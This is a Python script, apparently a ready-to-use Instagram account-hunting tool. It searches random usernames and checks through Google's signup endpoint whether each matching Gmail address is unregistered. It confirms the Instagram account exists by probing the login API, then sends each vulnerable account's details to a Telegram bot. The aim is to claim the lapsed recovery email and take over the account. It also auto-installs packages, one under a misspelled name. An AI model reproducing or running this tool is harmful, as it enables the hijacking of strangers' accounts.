import webbrowser
import os, sys, subprocess
import webbrowser

# - - - - - - - - - - - - - - - - - - - - - - - - - - -
import os, sys, subprocess

subprocess.getoutput("pip install mechanize")
import requests, sys, os, time

try:
    import requests, os, names, random, time, mechanize, sys
    from user_agent import generate_user_agent
    from uuid import uuid4
except:
    os.system("pip install requsets")
    os.system("pip install names")
    os.system("pip install user_agent")
    os.system("pip install uid")
    os.system("pip install uuid")
    os.system("clear")
import requests, os, names, json, random
import requests, os, names, random, time
from user_agent import generate_user_agent
from uuid import uuid4

uid = uuid4()
import requests, random, mechanize, time
import requests, random, mechanize, datetime

r = requests.session()

os.system('clear')
# - - - - - - - - - - - - - - - - - - - - - - - - - - -
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
F = '\033[2;32m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
Y = '\033[1;34m'  # ازرق فاتح.
C = "\033[1;97m"  # ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
W = "\033[1;37m"
P = Z

sid = input(f'{B}خلي سيزان ايدي  :- {Z}')
token = input(B + "خلي توكن بوتك :- " + Z)

ID = input(B + "خلي الايدي مالتك :- " + Z)

print(f'{Z}- - - - - - - - - - - - - - - - - - - - - - - - - -')
head = {
    'Cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid=' + sid}


def check(email, user):
    user = str(user)
    email = str(email)
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 6.12.1 Android (29/10; 320dpi; 720x1528; INFINIX MOBILITY LIMITED/Infinix; Infinix X690B; Infinix-X690B; mt6768; ar_EG)',
        'Accept': '*/*',
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
    data = {'uuid': uid, 'password': '@whisper666',
            'username': email,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
    req = requests.post(url, headers=headers, data=data).json()
    if req['message'] == 'The password you entered is incorrect. Please try again.':
        rr = requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis', headers=head).json()
        nam = str(rr['graphql']['user']['full_name'])
        iddd = str(rr['graphql']['user']['id'])
        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
        fols = str(rr['graphql']['user']['edge_follow']['count'])
        isp = str(rr['graphql']['user']['is_private'])
        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
        ree = re.json()
        dat = ree['data']
        print(f'{E}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        tlg = (f"""
شروحات رافع صادلك حساب :- {nam}
⚜️ 𝑈𝑆𝐸𝑅 :- {user}
⚜️ 𝐺𝑀𝐴𝐼𝐿 :- {email}
⚜️ 𝐹𝑂𝐿𝐿𝑂𝑊𝐸𝑅𝑆 :- {fol}
⚜️ 𝐹𝑂𝐿𝐿𝑂𝑊𝐼𝑁𝐺 :- {fols}
⚜️ 𝐷𝐴𝑇𝐸 :- {dat}
⚜️ 𝑃𝑂𝑆𝑇𝑆 :- {bio}
⚜️ 𝐿𝐼𝑁𝐾 :- https://www.instagram.com/{user}
𓏳𓏳𓏳𓏳𓏳𓏳𓏳 
⚜️ قناتي  @aa_22p""")
        print(G + tlg)
        print(f'{E}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        requests.get(
            "https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(tlg))
    if req[
        'message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
        print(f'{Z}< ❌ > Bad Acc :- {email}')


def yahoo(email, user):
    eml = str(email)
    email = eml.split('@')[0] + '@gmail.com'
    url = 'https://android.clients.google.com/setup/checkavail'
    h = {
        'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
    }
    d = json.dumps({
        'username': email,
        'version': '3',
        'firstName': 'AbaLahb',
        'lastName': 'AbuJahl'
    })
    res = requests.post(url, data=d, headers=h)
    if res.json()['status'] == 'SUCCESS':
        check(email, user)
    else:
        print(f'{X}< ✅✅✅✅> Secure :- {X}' + email)


def users():
    while True:
        #  mal=['male','femal']
        #  gen=random.choice(mal)
        user = 'qwertyuiopasdfghjklzxcvbnm1234567890'
        num = '56789'
        rng = int("".join(random.choice(num) for i in range(1)))
        name = str("".join(random.choice(user) for i in range(rng)))
        whisper = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',
                               headers=head).json()
        mn = 0
        try:
            while True:
                mn += 1
                user = str(whisper['users'][mn]['user']['username'])
                emai = user
                email = emai + '@gmail.com'
                yahoo(email, user)
        except IndexError:
            users()


users()